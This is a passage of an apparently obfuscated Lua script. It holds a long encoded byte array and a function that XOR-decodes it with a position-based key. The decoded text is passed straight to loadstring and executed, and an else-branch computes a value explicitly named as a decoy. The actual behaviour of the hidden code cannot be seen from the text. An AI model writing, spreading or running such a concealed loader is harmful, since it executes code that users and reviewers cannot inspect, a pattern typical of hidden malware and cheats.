10,36,93,97,152,162,207,244,236,30,5,113,75,113,152,184,217,181,87,123,97,66,63,105,132,191,155,174,163,117,49,34,71,111,146,184,227,252,13,11,91,75,68,126,139,244,196,225,11,46,93,106,57,147,134,163,193,176,27,51,87,1,81,148,138,239,205,224,73,107,15,53,22,11,200,156,215,253,29,35,67,115,119,146,147,152,180,228,10,39,80,80,132,140,146,170,238,26,9,59,104,54,137,128,176,240,177,192,49,6,95,123,148,151,225,209,214,56,45,29,123,109,136,241,243,151,247,239,2,1,9,41,142,185,185,198,205,4,39,72,75,74,131,170,221,242,173,53,7,124,72,107,129,141,140,204,254,52,45,24,113,107,135,233,135,129,197,34,20,95,120,146,154,159,141,235,229,15,62,116,110,140,167,215,239,225,236,11,2,18,103,131,167,203,184,181,168,29,62,79,47,150,183,215,251,26,122,127,103,17,6,228,189,212,248,162,104,64,103,84,107,138,174,223,225,54,13,42,85,78,123,129,161,205,178,19,43,66,66,125,142,194,164,209,231,24,124,84,74,99,138,195,186,197,230,72,44,71,19,59,37,192,183,160,167,83,63,89,82,109,158,160,216,247,47,71,101,83,126,103,150,156,182,212,15,15,23,73,101,99,170,234,196,251,241,2,44,96,125,149,155,161,251,140,13,46,89,103,99,132,191,247,209,252,224,5,101,23,32,128,134,136,221,173,3,50,90,78,103,198,227,242,147,156,118,120,18,86,111,176,214,180,212,197,11,46,88,96,106,128,190,162,235,242,59,38,85,119,210,184,211,205,217,235,11,32,80,57,146,181,222,199,207,139,108,73,42,7,248,187,212,242,172,138,14,33,64,46,217,245,147,153,120,81,119,115,5,57,200,244,140,169,179,86,115,127,19,54,204,132,237,194,21,238,46,95,7,57,159,189,196,254,63,112,39,90,123,148,162,189,214,221,81,55,62,92,66,181,145,168,251,235,6,39,37,84,58,36,255,156,140,173,80,117,33,62,55,216,241,221,239,18,5,26,22,92,108,136,175,132,142,92,68,21,104,104,91,191,239,231,212,198,36,29,7,100,106,146,153,194,196,46,97,87,120,99,103,162,171,214,194,236,0,42,64,153,39,210,238,140,172,78,114,24,42,7,128,146,189,215,181,90,112,25,46,13,247,244,143,150,169,93,110,3,33,35,200,214,254,137,200,50,3,66,96,131,179,149,241,222,232,8,59,118,48,143,188,208,169,225,244,5,17,28,96,145,188,216,249,214,227,59,34,69,99,145,178,146,178,179,87,125,101,15,42,237,218,145,185,182,87,126,103,11,35,202,177,192,233,249,242,43,16,79,103,133,163,211,227,20,2,116,26,56,218,194,232,136,249,3,31,53,79,114,208,193,237,230,207,49,71,30,126,64,33,246,207,211,233,59,32,44,97,39,149,178,213,248,49,16,46,6,67,109,146,180,166,133,91,68,111,106,8,40,202,196,185,240,231,21,81,122,92,100,153,181,149,141,92,54,91,104,112,81,159,190,215,231,11,64,126,8,105,111,151,162,217,251,77,61,86,124,102,111,192,240,145,180,89,111,24,3,245,241,178,219,202,252,80,54,84,102,109,86,151,191,207,240,84,110,14,98,145,160,182,149,217,239,6,59,64,55,154,187,191,182,205,26,127,97,5,43,249,208,254,157,148,176,72,97,19,57,215,255,132,133,160,94,30,3,124,100,137,164,209,151,173,6,50,36,75,65,202,182,199,193,250,60,46,82,116,50,135,181,196,238,213,6,54,97,121,152,177,174,215,172,168,88,121,28,1,215,192,193,170,172,166,79,104,16,54,44,253,147,217,248,1,30,96,86,114,145,164,194,235,19,22,73,125,0,43,217,252,133,215,9,12,33,97,7,38,172,158,252,215,165,53,114,21,15,56,129,179,209,203,15,60,106,0,114,97,142,183,253,253,27,13,46,39,114,108,150,236,138,170,76,112,22,62,7,8,210,163,209,231,23,26,69,75,120,147,175,157,140,167,3,56,64,126,116,115,145,166,230,168,78,111,94,126,128,158,248,172,203,230,13,62,19,54,219,208,249,228,128,94,84,77,74,111,154,143,246,223,194,240,8,24,80,98,147,186,187,143,175,85,55,34,89,103,177,167,160,215,228,83,58,46,70,114,141,166,230,140,180,94,83,59,15,46,218,255,151,141,180,68,98,0,52,212,238,246,130,130,197,48,10,86,79,132,185,228,149,209,236,9,38,108,63,115,179,213,198,201,248,20,20,10,119,146,183,212,219,8,229,58,62,76,100,147,189,158,131,89,161,76,104,6,38,226,193,155,184,170,113,117,56,65,106,128,163,147,236,21,62,119,94,115,106,159,188,209,218,93,100,19,48,111,101,155,152,139,161,31,55,80,104,82,100,141,244,195,247,21,44,122,51,121,168,182,221,206,239,8,120,19,15,63,32,195,232,190,141,127,32,73,100,121,209,231,159,148,185,65,61,83,97,118,187,170,170,250,21,41,31,71,103,113,218,229,146,159,190,70,39,64,126,154,164,188,219,255,13,122,36,69,39,196,211,244,189,145,91,115,50,78,117,147,132,151,206,231,28,60,69,80,38,135,161,170,216,244,29,36,87,51,155,188,166,161,197,140,123,93,55,54,215,240,231,234,209,239,1,60,71,54,114,180,222,136,207,229,25,50,70,123,161,244,142,229,236,11,6,37,127,43,209,182,216,192,246,204,81,36,64,86,148,174,195,185,190,93,54,47,73,111,191,186,215,207,21,23,56,81,122,34,134,181,204,227,16,118,82,109,56,51,206,240,205,253,6,47,5,27,73,97,169,162,250,179,94,32,49,93,122,181,227,216,250,214,31,62,52,70,106,223,223,231,241,227,19,44,103,70,109,166,164,215,205,235,20,112,93,82,123,129,187,200,147,85,126,14,2,29,106,140,184,208,247,162,9,43,84,102,71,205,229,193,234,17,56,13,17,101,103,161,161,195,244,8,122,120,1,147,155,130,165,230,254,29,1,70,81,106,145,204,174,202,245,29,60,58,31,252,209,211,237,149,165,25,55,77,113,160,175,142,166,201,245,67,43,76,118,144,182,189,203,151,170,82,101,66,120,129,188,231,198,237,17,31,112,71,105,155,182,208,202,155,117,103,111,6,104,138,191,246,186,129,80,123,61,70,120,129,173,227,190,191,27,58,94,111,98,140,128,148,233,251,47,59,39,120,112,153,233,154,167,10,9,1,73,65,141,252,160,204,243,26,6,89,51,51,218,172,210,249,237,62,87,112,1,63,140,132,160,250,202,80,62,32,76,99,187,247,149,201,237,54,59,44,87,68,215,180,160,201,30,63,92,50,82,46,197,243,211,197,210,22,32,122,79,102,206,160,205,237,29,52,74,39,13,35,133,180,208,214,82,121,104,2,111,152,185,165,230,177,9,35,92,122,38,46,133,174,195,225,18,42,124,43,151,155,182,169,195,229,6,33,24,32,211,152,131,145,210,245,13,63,12,120,159,186,186,169,172,132,100,73,4,58,135,182,163,220,224,14,71,111,6,37,133,189,177,220,240,22,42,101,70,103,132,187,251,148,136,25,57,28,19,98,152,176,144,135,182,22,53,98,127,100,137,160,217,137,245,27,62,45,116,11,225,194,171,140,138,97,92,93,77,155,209,198,133,235,253,12,114,29,57,215,221,180,180,176,170,88,109,85,108,146,131,229,244,240,79,41,99,68,120,154,151,156,213,242,59,31,30,95,74,206,245,238,178,90,63,46,83,68,123,217,191,202,235,233,67,102,19,6,51,205,241,206,248,29,54,105,106,3,44,149,188,213,247,65,53,38,74,117,212,167,164,193,228,21,27,8,64,75,73,202,224,137,180,80,110,14,48,25,244,200,227,200,236,26,32,84,114,100,156,197,237,235,7,4,49,3,125,146,131,160,177,231,178,3,44,69,99,144,149,163,146,182,92,68,68,36,38,214,214,249,180,153,84,17,48,75,110,141,170,172,193,236,84,58,34,92,98,208,234,170,215,244,30,54,81,55,146,130,165,162,136,180,28,41,45,118,118,197,170,192,208,239,74,124,93,79,156,180,228,198,200,230,1,113,28,56,214,246,152,188,129,131,126,110,7,57,143,250,228,160,250,249,0,43,78,107,140,167,232,133,252,92,31,104,16,47,143,186,222,246,28,60,122,66,4,127,211,241,148,251,10,14,7,106,5,108,204,185,143,174,88,34,60,42,80,144,137,254,212,246,7,37,21,78,59,198,253,181,223,234,13,116,93,33,66,107,133,159,136,179,79,71,32,7,127,157,148,163,133,174,28,60,95,78,115,156,151,232,240,17,9,48,73,119,72,153,135,174,193,243,37,38,79,119,49,129,160,216,225,24,13,56,78,37,120,148,187,210,255,118,106,73,44,40,135,136,169,190,147,59,58,39,81,42,209,196,140,212,245,4,114,90,106,139,146,138,184,135,183,88,123,74,27,155,132,163,227,131,165,73,69,58,67,220,229,233,168,140,255,21,37,79,114,135,245,151,154,128,168,82,109,10,16,246,176,166,241,213,172,42,42,71,126,204,239,135,132,223,23,10,58,15,114,131,243,158,186,183,125,84,13,3,121,154,240,240,255,37,240,4,118,87,106,158,165,200,221,2,17,40,47,1,195,206,141,222,246,27,85,12,93,121,149,176,224,134,174,88,89,66,15,0,113,135,158,250,243,53,60,42,96,98,146,170,165,197,215,28,55,32,80,47,197,195,254,241,28,41,99,69,81,121,154,190,226,131,166,75,75,39,29,114,206,226,209,188,20,13,37,83,64,125,129,177,156,190,8,8,45,73,116,113,170,165,196,242,28,37,42,84,109,37,151,190,216,224,95,52,95,117,156,112,228,196,172,155,19,52,90,31,243,192,144,186,199,208,24,33,68,68,219,244,148,166,196,249,18,63,117,120,131,187,177,201,240,245,21,100,93,107,159,174,172,222,142,238,11,39,68,115,203,241,153,226,151,119,14,37,75,51,201,242,157,178,155,2,32,89,118,122,155,189,200,188,161,95,57,94,70,96,139,173,196,233,214,7,35,32,116,145,129,187,247,249,223,17,50,90,87,151,186,218,201,238,87,81,110,30,63,34,199,157,172,156,3,15,34,88,48,223,238,232,209,239,80,45,14,92,107,153,131,219,240,31,5,54,63,74,77,152,189,180,228,234,62,37,37,82,65,131,172,202,255,26,58,59,36,111,97,150,163,215,240,44,8,36,107,119,40,196,244,146,241,2,26,40,68,81,44,144,164,150,207,20,53,92,119,126,111,142,147,209,237,19,13,82,120,136,65,140,149,196,238,6,3,91,126,159,154,133,231,222,224,11,110,95,124,211,210,244,152,148,139,89,105,10,56,213,254,189,193,186,212,61,102,12,100,159,163,176,251,181,81,27,47,90,125,132,235,190,218,244,27,121,86,68,125,154,238,150,154,255,27,13,88,71,97,138,231,203,201,239,29,54,100,63,220,204,199,189,217,255,61,50,91,110,216,231,158,249,248,237,21,25,77,113,115,130,231,213,241,198,26,44,94,99,148,139,170,199,11,231,79,114,23,45,252,236,159,198,89,125,78,104,14,125,134,188,161,215,170,4,59,51,91,46,194,226,142,176,88,90,5,37,119,74,210,247,154,190,87,68,37,80,124,145,205,164,212,239,31,115,126,99,82,115,132,158,197,254,29,43,17,88,123,97,131,171,132,180,85,120,55,30,59,38,194,224,170,143,86,108,70,113,56,220,151,178,250,226,5,59,16,102,116,147,190,194,243,234,27,106,26,55,149,143,145,217,255,255,69,47,66,102,134,130,246,224,187,88,98,68,5,51,197,207,246,148,184,86,126,88,85,123,149,247,224,220,239,17,3,78,15,97,141,178,172,143,236,31,48,49,106,136,132,184,238,142,169,0,41,106,123,150,175,157,207,203,247,0,32,28,61,32,197,177,169,142,170,72,104,32,3,221,177,163,213,244,173,66,12,66,109,150,187,207,247,31,15,22,33,72,103,135,160,205,199,171,243,47,35,66,99,130,229,200,253,21,31,28,99,0,48,209,222,180,235,22,6,126,28,60,222,232,197,205,225,85,111,65,31,81,107,131,146,199,253,11,58,6,87,124,113,158,169,209,244,84,119,28,17,58,37,193,159,149,140,11,46,91,72,55,169,144,164,203,214,16,33,82,70,89,148,183,198,233,235,28,46,6,98,121,151,254,210,244,168,68,98,2,14,10,148,167,208,253,18,19,41,72,62,104,139,173,220,179,78,117,77,126,100,209,135,169,219,246,16,65,23,0,43,237,233,228,134,170,80,82,79,121,148,143,202,237,146,168,123,81,26,115,146,185,208,131,137,247,1,36,76,110,154,128,214,135,141,237,11,40,110,47,211,230,229,218,241,237,3,126,88,110,128,182,155,185,184,90,126,100,12,54,251,195,208,250,201,242,124,103,85,104,139,166,238,176,241,18,8,53,109,106,156,183,253,174,19,237,50,124,57,221,220,250,143,252,25,17,14,111,73,108,171,161,147,233,4,9,61,94,125,32,202,229,130,152,126,116,61,94,112,115,133,221,215,162,68,119,113,94,123,146,141,234,202,233,22,34,117,17,47,207,241,149,187,163,103,69,75,81,125,140,253,145,251,233,10,22,1,71,101,165,246,158,164,75,70,34,71,79,106,195,181,209,230,27,116,94,119,38,47,202,231,189,149,20,4,22,54,121,104,134,183,236,229,3,54,105,111,139,97,136,188,216,167,30,50,23,120,144,163,179,224,132,205,77,56,85,125,244,238,210,204,209,243,70,123,8,120,138,191,183,210,247,254,42,32,96,111,158,191,244,217,246,28,49,32,11,121,145,174,210,209,170,136,123,100,15,118,146,233,150,142,228,29,43,50,123,123,131,179,225,224,240,244,53,26,118,157,131,169,194,146,159,79,34,59,3,53,254,180,220,225,226,31,61,126,121,136,134,160,209,254,0,16,121,67,121,96,176,209,151,114,30,19,112,7,53,129,143,166,210,194,5,12,36,69,97,156,183,148,246,227,15,40,47,57,25,253,209,193,246,227,22,41,17,64,113,138,151,217,253,17,10,37,45,73,35,209,247,192,252,20,39,126,113,72,111,201,170,215,244,21,51,63,19,1,97,145,172,203,248,29,51,50,51,114,99,135,168,213,194,33,21,101,94,206,144,186,214,209,227,9,26,73,110,137,73,247,253,139,230,17,36,99,111,148,156,141,222,255,238,75,34,82,106,157,177,210,187,156,117,56,44,79,30,226,162,169,201,235,225,40,99,14,42,200,194,196,132,177,9,10,50,111,104,204,241,154,158,180,83,121,23,80,171,158,229,197,213,240,11,44,31,86,104,179,230,213,192,255,5,15,18,54,210,202,226,210,255,226,1,29,12,63,123,184,213,232,17,207,93,45,80,88,209,193,226,133,128,114,6,54,71,121,205,170,192,247,238,27,22,39,64,51,130,180,223,186,247,14,126,77,83,97,137,177,201,228,84,16,11,41,12,100,130,220,191,154,125,123,82,85,70,7,229,236,249,196,44,1,125,108,102,43,149,164,228,247,25,33,119,3,115,107,134,173,143,235,28,44,65,118,96,212,248,158,134,154,102,97,16,119,116,105,162,220,196,243,2,108,74,102,110,148,145,156,164,169,15,62,92,103,129,136,178,199,181,91,40,50,76,112,141,159,169,155,242,226,58,45,65,3,234,236,197,133,161,90,72,29,50,120,132,177,163,138,246,13,59,93,116,138,254,232,185,208,230,31,56,77,1,107,179,183,169,139,250,12,62,67,116,139,199,165,241,199,231,17,35,72,80,35,253,151,185,178,174,72,41,86,122,148,129,174,232,138,86,30,52,71,120,131,128,136,250,233,197,110,76,59,31,220,167,186,148,225,12,49,92,121,35,212,241,200,230,53,246,17,39,70,114,202,245,145,175,101,92,120,95,81,96,134,162,148,168,88,56,36,90,117,109,148,181,195,166,76,116,125,50,24,41,196,189,200,237,5,11,64,89,118,154,133,159,133,178,74,62,82,124,111,145,176,211,137,165,67,99,47,37,34,154,137,213,184,250,6,108,24,55,58,204,246,152,164,67,99,104,95,119,98,199,235,200,242,246,59,36,122,40,97,139,166,139,163,11,12,74,120,110,186,206,238,137,247,7,48,68,55,217,253,194,192,185,163,94,111,29,29,37,190,153,167,249,231,15,37,66,52,220,198,225,183,160,162,83,49,92,127,46,183,200,216,255,32,28,63,66,106,154,179,159,160,210,21,80,100,31,36,133,164,208,250,177,251,6,53,92,112,130,244,157,245,207,81,108,8,44,113,154,177,149,248,254,226,76,49,68,101,157,186,223,237,28,10,32,76,67,126,142,183,218,243,89,12,48,72,10,46,229,204,209,241,31,26,126,23,41,36,138,175,194,239,76,119,114,16,26,255,250,158,193,237,8,54,6,29,117,140,160,254,136,190,10,33,49,70,104,166,253,154,170,167,13,39,68,76,122,155,160,192,179,85,121,31,45,61,39,202,241,220,248,238,26,96,71,71,105,150,169,228,184,88,80,112,87,42,72,184,154,158,164,78,122,22,43,216,158,141,189,218,250,75,123,28,63,14,244,153,229,222,232,3,39,68,68,158,145,190,217,222,206,74,55,66,88,223,230,248,214,243,9,68,32,87,114,129,178,212,204,172,113,76,53,89,120,158,228,195,208,243,238,46,72,64,66,135,189,253,140,195,20,23,49,16,40,215,231,222,221,249,228,15,49,70,173,156,182,252,183,238,7,30,50,45,35,199,181,221,253,198,88,120,77,71,101,184,216,229,224,231,4,52,68,116,104,135,166,238,246,14,38,107,77,102,189,223,182,138,175,6,11,39,88,113,143,144,158,143,247,4,19,39,84,92,145,179,220,254,210,30,38,62,84,76,194,182,219,222,126,85,52,72,93,111,158,182,212,203,236,55,92,38,105,45,144,183,204,246,22,13,108,57,21,41,158,180,222,241,23,7,89,116,117,149,172,232,222,236,9,53,87,20,47,209,195,191,218,227,31,41,64,66,216,43,187,216,194,250,29,49,121,103,155,190,237,210,244,28,4,107,8,48,158,142,184,185,196,23,52,111,71,104,138,164,162,190,145,140,108,90,64,106,248,218,162,199,213,8,63,72,60,32,198,238,221,191,166,93,65,58,90,159,149,176,199,199,171,4,36,26,76,71,173,225,213,208,251,21,111,87,87,223,185,216,243,203,233,54,122,104,80,87,171,240,158,179,210,86,120,64,124,145,163,154,130,172,166,105,94,90,114,148,166,155,196,235,51,127,53,74,101,211,187,209,159,136,108,101,36,86,95,185,154,145,227,28,119,117,108,7,32,196,183,194,246,81,59,52,37,10,96,139,168,193,251,89,14,82,86,74,39,130,165,139,220,52,31,27,84,123,137,242,163,222,235,17,42,79,68,64,146,142,228,202,234,6,105,95,127,125,118,179,213,201,249,11,32,92,112,105,144,162,223,255,82,21,43,70,32,36,193,175,207,208,14,11,108,2,124,141,174,189,199,239,205,90,88,64,111,150,221,172,218,246,9,45,74,127,158,138,128,246,140,174,28,54,14,7,145,135,178,163,198,128,97,90,59,60,100,143,161,224,217,227,25,97,90,77,157,242,206,216,197,233,10,43,90,126,47,139,181,203,178,186,30,34,2,34,213,160,201,213,222,237,64,114,14,54,183,131,239,250,233,46,31,96,72,107,145,179,219,158,137,173,69,41,65,98,128,160,213,195,2,1,47,11,15,32,128,182,223,239,12,22,15,51,70,70,219,166,202,236,18,127,100,22,67,100,131,185,215,235,42,37,38,70,92,216,178,167,211,228,4,82,85,49,45,223,246,232,231,171,42,100,10,93,120,33,245,155,135,164,67,112,8,30,53,215,167,193,196,31,40,43,92,71,34,218,191,208,194,89,64,111,9,58,120,200,190,198,201,224,22,94,67,103,5,249,234,159,236,14,11,92,83,155,96,138,185,192,135,112,126,109,84,136,182,138,166,200,231,25,42,70,104,13,239,254,226,242,207,90,96,27,12,208,246,247,145,141,171,67,117,30,61,45,204,233,229,179,170,95,99,1,33,195,255,149,146,132,169,76,124,31,56,215,253,148,238,178,80,112,18,14,36,220,246,155,190,143,174,108,70,88,110,148,180,253,175,170,84,122,98,124,84,161,244,147,184,232,19,57,43,77,67,192,159,152,215,126,112,33,81,68,99,187,238,158,173,88,83,113,17,51,154,175,164,233,170,8,2,34,123,63,168,224,146,175,142,77,107,102,103,70,65,251,223,198,224,24,50,35,65,116,153,151,148,172,90,64,58,52,71,106,156,178,254,130,29,20,32,73,115,37,186,245,234,147,142,115,22,6,6,35,222,228,159,176,84,122,26,52,49,47,199,249,130,161,81,112,109,8,214,46,195,231,133,165,71,99,25,49,43,45,240,224,131,188,91,97,24,13,209,212,244,150,178,168,64,93,63,124,218,192,216,231,189,166,81,109,11,43,205,241,146,247,136,225,15,26,17,73,211,148,221,207,237,89,124,4,2,40,208,250,149,145,129,198,44,106,69,106,149,188,254,141,210,89,2,75,38,117,198,243,142,150,187,81,122,101,1,223,255,225,133,171,224,25,36,97,4,88,194,150,169,129,187,95,125,29,63,219,241,233,131,164,168,88,123,20,51,217,240,229,137,175,79,78,106,0,56,210,247,154,138,165,70,66,104,3,52,216,254,158,184,84,114,75,125,6,37,213,244,145,140,90,106,70,35,64,107,171,234,220,249,239,47,85,7,10,113,210,250,252,209,88,20,99,127,45,52,219,243,243,160,32,86,50,9,52,47,192,228,138,170,68,96,30,54,9,210,241,225,128,189,88,102,25,50,55,213,245,151,179,169,65,123,28,35,211,211,204,235,177,168,93,97,7,39,193,194,248,144,138,175,114,98,29,25,245,182,141,233,233,26,54,79,78,97,193,190,189,217,210,245,23,97,107,102,154,189,188,166,131,120,85,105,18,37,206,227,250,215,239,3,99,109,2,220,254,178,203,137,245,50,52,92,105,42,130,161,195,205,189,22,33,70,99,129,168,172,217,135,185,84,39,76,78,151,149,165,204,235,160,14,39,79,123,146,211,187,143,183,169,28,43,13,124,189,183,209,245,20,45,75,42,71,102,144,240,220,206,31,45,29,54,76,119,197,244,143,229,245,15,60,1,76,111,144,171,192,187,27,52,55,89,118,10,229,240,223,239,3,58,82,18,58,33,158,167,134,175,13,33,83,119,13,140,190,178,205,227,36,38,82,94,118,187,247,221,243,226,75,39,85,116,125,145,176,169,250,231,0,7,1,41,55,206,166,200,245,228,51,47,65,96,115,159,160,224,240,27,57,83,76,12,227,253,223,165,146,228,13,45,20,10,158,132,165,139,227,3,34,75,76,118,193,208,241,148,147,98,60,45,122,221,244,157,173,219,226,21,1,64,71,116,137,135,226,129,240,28,39,70,83,128,169,176,162,224,231,29,61,113,38,145,251,180,205,191,86,67,42,88,97,146,140,151,141,193,228,4,43,111,99,128,163,216,213,242,18,13,8,19,101,214,165,213,191,92,95,28,54,67,82,144,167,193,196,228,19,56,41,73,102,133,142,141,178,18,31,58,93,90,139,148,163,197,207,29,52,53,7,45,99,203,169,215,240,19,46,34,24,76,152,178,190,139,237,83,47,56,28,56,214,246,178,145,240,15,32,76,74,105,157,183,135,180,241,11,51,73,75,89,129,178,216,202,204,125,41,64,81,53,153,177,198,250,21,9,87,126,102,99,186,241,147,190,28,66,43,124,101,127,128,234,138,172,80,92,51,1,43,175,189,152,199,253,9,119,44,113,149,168,190,175,210,233,115,89,59,44,127,239,228,218,221,225,27,109,16,47,149,191,137,184,192,234,33,39,89,116,153,137,170,180,235,63,64,100,10,50,246,218,152,166,209,245,24,98,22,54,159,162,209,247,241,18,46,35,93,66,151,183,203,217,252,8,18,2,1,33,195,231,167,152,178,28,35,52,83,42,210,229,195,235,245,52,32,81,108,152,167,188,199,225,51,23,47,53,87,223,202,230,132,142,107,69,127,3,1,193,249,186,196,228,29,36,40,90,90,213,245,151,187,139,100,127,127,24,58,198,254,167,252,231,29,26,40,67,109,155,134,154,132,95,124,70,65,3,113,153,191,223,252,88,101,26,115,81,106,179,191,217,232,63,21,52,125,73,92,203,233,137,171,101,88,17,5,8,137,139,129,154,183,95,0,99,61,198,218,178,175,207,253,10,54,102,77,115,98,174,158,135,178,78,70,33,34,151,132,179,168,194,161,76,114,81,127,156,187,130,209,216,16,45,34,111,126,143,163,147,226,131,166,75,75,39,110,209,242,238,215,253,28,12,35,100,105,134,180,254,156,254,26,5,45,76,10,239,204,161,193,248,1,52,41,118,101,143,167,194,251,189,2,35,86,110,156,137,159,138,186,182,5,63,70,116,146,185,169,194,224,235,36,110,90,65,152,183,164,163,129,185,68,60,72,115,141,181,218,202,162,64,20,47,64,111,136,184,145,236,228,43,93,32,72,102,140,241,132,131,13,41,15,50,79,127,185,242,209,248,20,56,85};
local _0x9094d84 = 57;
local _0xdf0ac7b = 26;
local _0xa66dfbd = 17;
local _0x9e20cbc = 31;

local _0x_unp = function(data, key, p1, p2, p3)
    local bxor = (bit32 and bit32.bxor) or (bit and bit.bxor) or function(a,b)
        local r,p=0,1 while a>0 or b>0 do local ra,rb=a%2,b%2 if ra~=rb then r=r+p end a,b,p=(a-ra)/2,(b-rb)/2,p*2 end return r
    end;

    local strTbl = {};
    local total = #data;
    for i = total, 1, -1 do
        local idx = total - i;
        local k = (key + idx * p1 + (idx * idx % p2) + (idx * 3 % p3)) % 256;
        local charCode = bxor(data[i], k) % 256;
        table.insert(strTbl, string.char(charCode));
    end;
    return table.concat(strTbl);
end;

local _0x_fn = (loadstring or load)(_0x_unp(_0x912815b, _0x9094d84, _0xdf0ac7b, _0xa66dfbd, _0x9e20cbc));
if _0x_fn then
    _0x_fn();
end;

else
    local _0xdecoy = math.sin(os.clock());
end
